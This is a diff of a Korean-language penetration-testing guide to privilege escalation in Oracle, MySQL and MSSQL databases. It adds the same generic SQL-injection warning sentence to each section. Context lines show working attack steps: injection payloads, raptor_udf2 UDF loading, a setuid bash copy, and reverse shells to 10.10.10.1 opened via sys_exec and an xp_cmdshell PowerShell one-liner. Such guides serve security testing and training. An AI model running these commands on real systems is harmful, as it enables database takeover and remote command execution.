@@ -21,6 +21,8 @@ root / SYSTEM
 
 ### 2-1. 현재 권한 및 역할 확인
 
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 현재 사용자
 SELECT USER FROM DUAL;
@@ -42,6 +44,8 @@ AND OWNER != USER;
 
 ### 2-2. CREATE ANY PROCEDURE 악용
 
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- CREATE ANY PROCEDURE 권한이 있으면 SYS 소유 프로시저 덮어쓰기 가능
 -- 대상: 취약한 Oracle 버전 (11.2 이하 일부)
@@ -59,6 +63,8 @@ END;
 
 ### 2-3. DBMS_XMLQUERY / DBMS_METADATA 인젝션
 
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- DBMS_XMLQUERY를 통한 권한 상승 (CVE-2010-3600 등)
 -- 파라미터 인젝션으로 SYS 컨텍스트에서 쿼리 실행
@@ -69,6 +75,8 @@ WHERE COMP_NAME LIKE '%XML%';
 ```
 
 ### 2-4. 저장 프로시저 내 SQLi (Second-Order)
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- 프로시저 내부에 동적 SQL이 있을 경우
@@ -92,6 +100,8 @@ EXEC get_user_data(q'[' UNION SELECT 1,user,3 FROM dual--]');
 
 ### 3-1. 현재 권한 확인
 
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 현재 사용자 권한
 SHOW GRANTS FOR CURRENT_USER();
@@ -102,6 +112,8 @@ FROM mysql.user WHERE user = CURRENT_USER();
 ```
 
 ### 3-2. MySQL 취약한 설정 악용
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- 1. FILE 권한 → 웹쉘 / 설정 파일 읽기
@@ -121,6 +133,8 @@ DO CALL sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
 
 ### 3-3. MySQL 8.x 계정 조작
 
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 플러그인 우회 (caching_sha2_password → mysql_native_password)
 ALTER USER 'root'@'localhost'
@@ -134,6 +148,9 @@ FLUSH PRIVILEGES;
 
 ### 3-4. Raptor_UDF2 기법 (고전 MySQL 권한 상승)
 
+
+UDF(User Defined Function) 인젝션은 MySQL에서 공유 라이브러리를 로드하여 OS 수준 명령 실행 권한을 얻는 기법입니다. `FILE` 권한이 있으면 `sys_exec()` 함수를 생성하여 OS 명령을 실행할 수 있습니다.
+
 ```bash
 # 도구 준비
 git clone https://github.com/RalfHacker/raptor_udf2.git
@@ -142,6 +159,8 @@ gcc -shared -fPIC raptor_udf2.c -o raptor_udf2.so
 # MySQL 로그인 후
 mysql -u root -p
 ```
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 USE mysql;
@@ -158,6 +177,8 @@ SELECT do_system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
 ## 4. MSSQL 권한 상승
 
 ### 4-1. xp_cmdshell 활성화 및 명령 실행
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- xp_cmdshell 활성화 (sysadmin 필요)
@@ -177,6 +198,8 @@ EXEC xp_cmdshell 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\"10.1
 
 ### 4-2. Linked Server 악용
 
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 링크드 서버 목록
 SELECT name, provider FROM sys.servers WHERE is_linked = 1;
@@ -189,6 +212,8 @@ EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name];
 ```
 
 ### 4-3. Impersonation (사용자 가장)
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
 
 ```sql
 -- 가장할 수 있는 사용자 확인
